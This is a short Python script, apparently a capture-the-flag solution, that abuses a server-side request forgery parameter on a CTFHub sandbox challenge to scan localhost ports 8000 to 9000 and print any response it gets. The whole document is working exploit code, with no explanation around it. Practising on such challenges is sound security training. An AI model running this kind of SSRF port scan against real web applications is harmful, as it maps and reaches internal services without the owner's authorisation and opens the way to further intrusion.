import requests

base_url = "http://challenge-d11d59bf5b106116.sandbox.ctfhub.com:10800/?url=127.0.0.1:"

for port in range(8000, 9001):
    url = f"{base_url}{port}"
    try:
        response = requests.get(url, timeout=2)
        # print(f"Port {port}: Status Code {response.status_code}")
        content_length = len(response.content)
        if content_length > 0:
            print(f"Port {port}: Status Code {response.status_code}")
            print(f"Response Length: {content_length} bytes")
            print(response.content.decode('utf-8'))
    except requests.exceptions.RequestException as e:
        print(f"Port {port}: Error - {e}")